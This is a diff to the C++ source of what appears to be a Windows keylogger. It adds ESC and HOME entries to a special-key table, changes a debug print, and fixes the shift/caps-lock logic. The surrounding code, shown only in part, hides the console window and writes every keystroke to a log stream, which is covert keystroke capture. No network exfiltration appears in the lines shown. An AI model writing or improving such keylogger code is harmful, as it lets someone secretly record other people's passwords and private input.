@@ -14,9 +14,11 @@ std::map<int, std::string> spcl_key_map = {
     {17, "#CTR#"}, // CTRL
     {18, "#ALT#"}, // Alt
     {20, "#CPL#"}, // caps lock
+    {27, "#ESC#"}, // escape
     {32, " "}, // space
     {33, "#PUP#"}, // page up
     {34, "#PDN#"}, // page down
+    {36, "#HOM#"}, // home
     {37, "#LFA#"}, // left arrow
     {38, "#DNA#"}, // down arrow
     {39, "#RTA#"}, // right arrow
@@ -52,6 +54,7 @@ std::map<char, std::string> shft_key_map = {
 
 bool caps_lock = false;
 bool shft_key = false;
+bool shft = false;
 
 
 void hideConsole(){
@@ -98,7 +101,7 @@ int main(){
 
                     keylog << spcl_key_map[vkey];
                     keylog.flush();
-                    std::cout << spcl_key_map[vkey] << std::endl;
+                    std::cout << vkey << spcl_key_map[vkey] << std::endl;
                     key_state[vkey] = true;
                     continue;
                 }
@@ -106,7 +109,9 @@ int main(){
                 std::cout << vkey;
                 key_char = MapVirtualKey(vkey, MAPVK_VK_TO_CHAR);
                 
-                if (caps_lock || shft_key) { 
+                shft = (shft_key || caps_lock) && (!shft_key || !caps_lock);
+
+                if (shft) { 
 
                     if(shft_key_map[key_char] != ""){ // handles the shift value of a key
                         keylog << shft_key_map[key_char];
